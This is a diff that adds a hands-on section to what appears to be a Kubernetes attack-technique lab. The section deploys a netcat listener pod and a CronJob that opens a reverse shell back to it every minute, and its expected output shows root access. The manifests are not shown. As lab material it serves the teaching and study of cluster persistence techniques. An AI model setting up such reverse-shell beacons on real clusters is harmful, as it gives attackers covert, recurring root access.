@@ -134,6 +134,70 @@ A CronJob can also be used to establish periodic reverse-shell connections rathe
 
 This pattern means the attacker does not need a persistent listener — they can connect opportunistically at scheduled times.
 
+## Reverse Shell Beacon
+
+This section converts the conceptual reverse-shell beacon from Step 7 into a hands-on demo using two manifests: a listener pod and a CronJob that connects back to it every minute.
+
+### Step 8 — Deploy the listener pod
+
+The listener runs `netcat` in a loop, accepting one connection at a time and printing whatever the remote shell sends:
+
+```bash
+kubectl apply -f listener-pod.yaml
+kubectl wait --for=condition=Ready pod/beacon-listener --timeout=60s
+```
+
+Note the listener's cluster IP for reference:
+
+```bash
+kubectl get svc beacon-listener
+```
+
+### Step 9 — Deploy the beacon CronJob
+
+The CronJob runs every minute. Each execution opens a reverse shell back to the listener service:
+
+```bash
+kubectl apply -f beacon-cronjob.yaml
+```
+
+Verify the CronJob is scheduled:
+
+```bash
+kubectl get cronjob reverse-beacon
+```
+
+### Step 10 — Observe the connections
+
+Watch the listener pod's logs to see incoming reverse-shell connections. Each connection runs `id` and `hostname` then exits:
+
+```bash
+# Wait ~60 seconds for the first CronJob execution, then check logs
+kubectl logs beacon-listener -f
+```
+
+Expected output (one block per CronJob execution):
+
+```
+Listening on 0.0.0.0:4444
+Connection received
+uid=0(root) gid=0(root)
+reverse-beacon-<jobid>
+```
+
+You can also watch job pods being created and completing:
+
+```bash
+kubectl get pods -l app=reverse-beacon --watch
+```
+
+### Beacon Cleanup
+
+```bash
+kubectl delete -f beacon-cronjob.yaml
+kubectl delete -f listener-pod.yaml
+```
+
 ## Cleanup
 
 ```bash
